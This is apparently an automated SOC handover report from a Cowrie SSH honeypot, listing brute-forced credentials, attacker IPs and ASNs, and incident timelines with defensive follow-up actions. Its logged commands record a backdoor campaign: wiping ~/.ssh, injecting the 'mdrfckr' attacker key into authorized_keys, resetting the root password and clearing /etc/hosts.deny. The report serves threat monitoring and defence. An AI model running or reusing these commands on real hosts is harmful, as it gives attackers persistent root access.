# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-27 |
| **Generated At** | 2026-03-27T13:01:41Z |
| **Shift Time** | 13:01 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **80** |
| Confirmed Threats | **46** |
| False Positives Filtered | **34** (42.5%) |
| Unique Attacker IPs | **38** |
| Countries of Origin | **17** |
| High Severity Cases | **15** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **65** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **39** |
| Unique Credential Pairs | **28** |
| Unique Usernames | **18** |
| Unique Passwords | **28** |
| Successful Auth Pairs | **15** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 15 |
| `345gs5662d34` | 6 |
| `debian` | 2 |
| `pi` | 2 |
| `unknown` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 6 |
| `3245gs5662d34` | 6 |
| `cisco123` | 2 |
| `666666` | 1 |
| `debian2019` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 6 |
| `root` | `3245gs5662d34` | 6 |
| `root` | `cisco123` | 2 |
| `unknown` | `666666` | 1 |
| `debian` | `debian2019` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `asdfasdf` | `66.96.237.254` | 2026-03-27T11:37:26 |
| `root` | `3245gs5662d34` | `66.96.237.254` | 2026-03-27T11:37:29 |
| `root` | `lucas123` | `8.218.16.231` | 2026-03-27T12:27:00 |
| `root` | `3245gs5662d34` | `8.218.16.231` | 2026-03-27T12:27:03 |
| `root` | `3edcvgy7` | `177.53.247.76` | 2026-03-27T12:33:11 |
| `root` | `3245gs5662d34` | `177.53.247.76` | 2026-03-27T12:33:18 |
| `root` | `2024@` | `47.237.10.247` | 2026-03-27T12:34:04 |
| `root` | `3245gs5662d34` | `47.237.10.247` | 2026-03-27T12:34:07 |
| `root` | `Xc.123456` | `112.66.128.10` | 2026-03-27T12:34:45 |
| `root` | `Wj123456.` | `47.86.18.208` | 2026-03-27T12:36:12 |
| `root` | `3245gs5662d34` | `47.86.18.208` | 2026-03-27T12:36:15 |
| `root` | `rP2uv5p2Ta!` | `8.222.202.6` | 2026-03-27T12:40:14 |
| `root` | `3245gs5662d34` | `8.222.202.6` | 2026-03-27T12:40:16 |
| `root` | `cisco123` | `34.29.104.32` | 2026-03-27T12:57:04 |
| `root` | `cisco123` | `65.20.204.179` | 2026-03-27T12:57:11 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:IugK33HuxGZe"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `112.66.128.10`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `47.86.18.208`, `177.53.247.76`, `8.218.16.231`, `47.237.10.247`, `8.222.202.6`, `66.96.237.254`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **38** |
| Unique ASNs | **29** |
| High-Risk ASNs | **21** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 4 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 3 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS8151` | UNINET | 2 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 2 | HIGH |
| `AS63859` | PT. Eka Mas Republik | 1 | HIGH |
| `AS8434` | Telenor Sverige AB | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (15)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-e5d8374e0f66

| Field | Detail |
|---|---|
| **Source IP** | `66.96.237[.]254` |
| **First Seen** | 2026-03-27 11:37 |
| **Last Seen** | 2026-03-27 11:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 11:37:26` | `cowrie.session.connect` |
| `2026-03-27 11:37:26` | `cowrie.client.version` |
| `2026-03-27 11:37:26` | `cowrie.client.kex` |
| `2026-03-27 11:37:26` | `cowrie.login.success` |
| `2026-03-27 11:37:27` | `cowrie.session.params` |
| `2026-03-27 11:37:27` | `cowrie.command.input` |
| `2026-03-27 11:37:27` | `cowrie.command.failed` |
| `2026-03-27 11:37:27` | `cowrie.log.closed` |
| `2026-03-27 11:37:27` | `cowrie.session.params` |
| `2026-03-27 11:37:27` | `cowrie.command.input` |
| `2026-03-27 11:37:27` | `cowrie.session.file_download` |
| `2026-03-27 11:37:27` | `cowrie.log.closed` |
| `2026-03-27 11:37:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.96.237[.]254` to AbuseIPDB if not already reported
- [ ] Block `66.96.237[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1917e4ab89a

| Field | Detail |
|---|---|
| **Source IP** | `66.96.237[.]254` |
| **First Seen** | 2026-03-27 11:37 |
| **Last Seen** | 2026-03-27 11:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 11:37:29` | `cowrie.session.connect` |
| `2026-03-27 11:37:29` | `cowrie.client.version` |
| `2026-03-27 11:37:29` | `cowrie.client.kex` |
| `2026-03-27 11:37:29` | `cowrie.login.success` |
| `2026-03-27 11:37:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.96.237[.]254` to AbuseIPDB if not already reported
- [ ] Block `66.96.237[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49131c154293

| Field | Detail |
|---|---|
| **Source IP** | `8.218.16[.]231` |
| **First Seen** | 2026-03-27 12:26 |
| **Last Seen** | 2026-03-27 12:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 12:26:59` | `cowrie.session.connect` |
| `2026-03-27 12:26:59` | `cowrie.client.version` |
| `2026-03-27 12:26:59` | `cowrie.client.kex` |
| `2026-03-27 12:27:00` | `cowrie.login.success` |
| `2026-03-27 12:27:00` | `cowrie.session.params` |
| `2026-03-27 12:27:00` | `cowrie.command.input` |
| `2026-03-27 12:27:00` | `cowrie.command.failed` |
| `2026-03-27 12:27:00` | `cowrie.log.closed` |
| `2026-03-27 12:27:00` | `cowrie.session.params` |
| `2026-03-27 12:27:00` | `cowrie.command.input` |
| `2026-03-27 12:27:00` | `cowrie.session.file_download` |
| `2026-03-27 12:27:00` | `cowrie.log.closed` |
| `2026-03-27 12:27:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.218.16[.]231` to AbuseIPDB if not already reported
- [ ] Block `8.218.16[.]231` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e78d454b22b4

| Field | Detail |
|---|---|
| **Source IP** | `8.218.16[.]231` |
| **First Seen** | 2026-03-27 12:27 |
| **Last Seen** | 2026-03-27 12:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 12:27:02` | `cowrie.session.connect` |
| `2026-03-27 12:27:02` | `cowrie.client.version` |
| `2026-03-27 12:27:02` | `cowrie.client.kex` |
| `2026-03-27 12:27:03` | `cowrie.login.success` |
| `2026-03-27 12:27:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.218.16[.]231` to AbuseIPDB if not already reported
- [ ] Block `8.218.16[.]231` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb07b00d0e05

| Field | Detail |
|---|---|
| **Source IP** | `177.53.247[.]76` |
| **First Seen** | 2026-03-27 12:33 |
| **Last Seen** | 2026-03-27 12:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 12:33:09` | `cowrie.session.connect` |
| `2026-03-27 12:33:09` | `cowrie.client.version` |
| `2026-03-27 12:33:09` | `cowrie.client.kex` |
| `2026-03-27 12:33:11` | `cowrie.login.success` |
| `2026-03-27 12:33:12` | `cowrie.session.params` |
| `2026-03-27 12:33:12` | `cowrie.command.input` |
| `2026-03-27 12:33:12` | `cowrie.command.failed` |
| `2026-03-27 12:33:12` | `cowrie.log.closed` |
| `2026-03-27 12:33:13` | `cowrie.session.params` |
| `2026-03-27 12:33:13` | `cowrie.command.input` |
| `2026-03-27 12:33:13` | `cowrie.session.file_download` |
| `2026-03-27 12:33:13` | `cowrie.log.closed` |
| `2026-03-27 12:33:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.53.247[.]76` to AbuseIPDB if not already reported
- [ ] Block `177.53.247[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff8d9fece788

| Field | Detail |
|---|---|
| **Source IP** | `177.53.247[.]76` |
| **First Seen** | 2026-03-27 12:33 |
| **Last Seen** | 2026-03-27 12:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 12:33:17` | `cowrie.session.connect` |
| `2026-03-27 12:33:17` | `cowrie.client.version` |
| `2026-03-27 12:33:17` | `cowrie.client.kex` |
| `2026-03-27 12:33:18` | `cowrie.login.success` |
| `2026-03-27 12:33:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.53.247[.]76` to AbuseIPDB if not already reported
- [ ] Block `177.53.247[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0d4f6e59243

| Field | Detail |
|---|---|
| **Source IP** | `47.237.10[.]247` |
| **First Seen** | 2026-03-27 12:34 |
| **Last Seen** | 2026-03-27 12:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 12:34:04` | `cowrie.session.connect` |
| `2026-03-27 12:34:04` | `cowrie.client.version` |
| `2026-03-27 12:34:04` | `cowrie.client.kex` |
| `2026-03-27 12:34:04` | `cowrie.login.success` |
| `2026-03-27 12:34:04` | `cowrie.session.params` |
| `2026-03-27 12:34:04` | `cowrie.command.input` |
| `2026-03-27 12:34:04` | `cowrie.command.failed` |
| `2026-03-27 12:34:05` | `cowrie.log.closed` |
| `2026-03-27 12:34:05` | `cowrie.session.params` |
| `2026-03-27 12:34:05` | `cowrie.command.input` |
| `2026-03-27 12:34:05` | `cowrie.session.file_download` |
| `2026-03-27 12:34:05` | `cowrie.log.closed` |
| `2026-03-27 12:34:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.237.10[.]247` to AbuseIPDB if not already reported
- [ ] Block `47.237.10[.]247` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb401203e2b0

| Field | Detail |
|---|---|
| **Source IP** | `47.237.10[.]247` |
| **First Seen** | 2026-03-27 12:34 |
| **Last Seen** | 2026-03-27 12:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 12:34:06` | `cowrie.session.connect` |
| `2026-03-27 12:34:06` | `cowrie.client.version` |
| `2026-03-27 12:34:06` | `cowrie.client.kex` |
| `2026-03-27 12:34:07` | `cowrie.login.success` |
| `2026-03-27 12:34:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.237.10[.]247` to AbuseIPDB if not already reported
- [ ] Block `47.237.10[.]247` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20f95d750244

| Field | Detail |
|---|---|
| **Source IP** | `112.66.128[.]10` |
| **First Seen** | 2026-03-27 12:34 |
| **Last Seen** | 2026-03-27 12:35 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:IugK33HuxGZe"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 12:34:45` | `cowrie.session.connect` |
| `2026-03-27 12:34:45` | `cowrie.client.version` |
| `2026-03-27 12:34:45` | `cowrie.client.kex` |
| `2026-03-27 12:34:45` | `cowrie.login.success` |
| `2026-03-27 12:34:46` | `cowrie.session.params` |
| `2026-03-27 12:34:46` | `cowrie.command.input` |
| `2026-03-27 12:34:46` | `cowrie.command.failed` |
| `2026-03-27 12:34:46` | `cowrie.log.closed` |
| `2026-03-27 12:34:46` | `cowrie.session.params` |
| `2026-03-27 12:34:46` | `cowrie.command.input` |
| `2026-03-27 12:34:46` | `cowrie.session.file_download` |
| `2026-03-27 12:34:46` | `cowrie.log.closed` |
| `2026-03-27 12:35:03` | `cowrie.session.params` |
| `2026-03-27 12:35:03` | `cowrie.command.input` |
| `2026-03-27 12:35:03` | `cowrie.log.closed` |
| `2026-03-27 12:35:03` | `cowrie.session.params` |
| `2026-03-27 12:35:03` | `cowrie.command.input` |
| `2026-03-27 12:35:03` | `cowrie.log.closed` |
| `2026-03-27 12:35:04` | `cowrie.session.params` |
| `2026-03-27 12:35:04` | `cowrie.command.input` |
| `2026-03-27 12:35:04` | `cowrie.session.file_download` |
| `2026-03-27 12:35:04` | `cowrie.log.closed` |
| `2026-03-27 12:35:04` | `cowrie.session.params` |
| `2026-03-27 12:35:04` | `cowrie.command.input` |
| `2026-03-27 12:35:05` | `cowrie.log.closed` |
| `2026-03-27 12:35:05` | `cowrie.session.params` |
| `2026-03-27 12:35:05` | `cowrie.command.input` |
| `2026-03-27 12:35:05` | `cowrie.log.closed` |
| `2026-03-27 12:35:06` | `cowrie.session.params` |
| `2026-03-27 12:35:06` | `cowrie.command.input` |
| `2026-03-27 12:35:06` | `cowrie.command.input` |
| `2026-03-27 12:35:06` | `cowrie.log.closed` |
| `2026-03-27 12:35:06` | `cowrie.session.params` |
| `2026-03-27 12:35:06` | `cowrie.command.input` |
| `2026-03-27 12:35:06` | `cowrie.log.closed` |
| `2026-03-27 12:35:07` | `cowrie.session.params` |
| `2026-03-27 12:35:07` | `cowrie.command.input` |
| `2026-03-27 12:35:07` | `cowrie.log.closed` |
| `2026-03-27 12:35:07` | `cowrie.session.params` |
| `2026-03-27 12:35:07` | `cowrie.command.input` |
| `2026-03-27 12:35:07` | `cowrie.log.closed` |
| `2026-03-27 12:35:08` | `cowrie.session.params` |
| `2026-03-27 12:35:08` | `cowrie.command.input` |
| `2026-03-27 12:35:08` | `cowrie.log.closed` |
| `2026-03-27 12:35:08` | `cowrie.session.params` |
| `2026-03-27 12:35:08` | `cowrie.command.input` |
| `2026-03-27 12:35:09` | `cowrie.log.closed` |
| `2026-03-27 12:35:09` | `cowrie.session.params` |
| `2026-03-27 12:35:09` | `cowrie.command.input` |
| `2026-03-27 12:35:09` | `cowrie.log.closed` |
| `2026-03-27 12:35:09` | `cowrie.session.params` |
| `2026-03-27 12:35:09` | `cowrie.command.input` |
| `2026-03-27 12:35:10` | `cowrie.log.closed` |
| `2026-03-27 12:35:10` | `cowrie.session.params` |
| `2026-03-27 12:35:10` | `cowrie.command.input` |
| `2026-03-27 12:35:10` | `cowrie.log.closed` |
| `2026-03-27 12:35:11` | `cowrie.session.params` |
| `2026-03-27 12:35:11` | `cowrie.command.input` |
| `2026-03-27 12:35:11` | `cowrie.log.closed` |
| `2026-03-27 12:35:11` | `cowrie.session.params` |
| `2026-03-27 12:35:11` | `cowrie.command.input` |
| `2026-03-27 12:35:11` | `cowrie.log.closed` |
| `2026-03-27 12:35:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.66.128[.]10` to AbuseIPDB if not already reported
- [ ] Block `112.66.128[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a69e9ccc0c0d

| Field | Detail |
|---|---|
| **Source IP** | `47.86.18[.]208` |
| **First Seen** | 2026-03-27 12:36 |
| **Last Seen** | 2026-03-27 12:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 12:36:12` | `cowrie.session.connect` |
| `2026-03-27 12:36:12` | `cowrie.client.version` |
| `2026-03-27 12:36:12` | `cowrie.client.kex` |
| `2026-03-27 12:36:12` | `cowrie.login.success` |
| `2026-03-27 12:36:12` | `cowrie.session.params` |
| `2026-03-27 12:36:12` | `cowrie.command.input` |
| `2026-03-27 12:36:12` | `cowrie.command.failed` |
| `2026-03-27 12:36:12` | `cowrie.log.closed` |
| `2026-03-27 12:36:13` | `cowrie.session.params` |
| `2026-03-27 12:36:13` | `cowrie.command.input` |
| `2026-03-27 12:36:13` | `cowrie.session.file_download` |
| `2026-03-27 12:36:13` | `cowrie.log.closed` |
| `2026-03-27 12:36:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.86.18[.]208` to AbuseIPDB if not already reported
- [ ] Block `47.86.18[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fa64e495495

| Field | Detail |
|---|---|
| **Source IP** | `47.86.18[.]208` |
| **First Seen** | 2026-03-27 12:36 |
| **Last Seen** | 2026-03-27 12:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
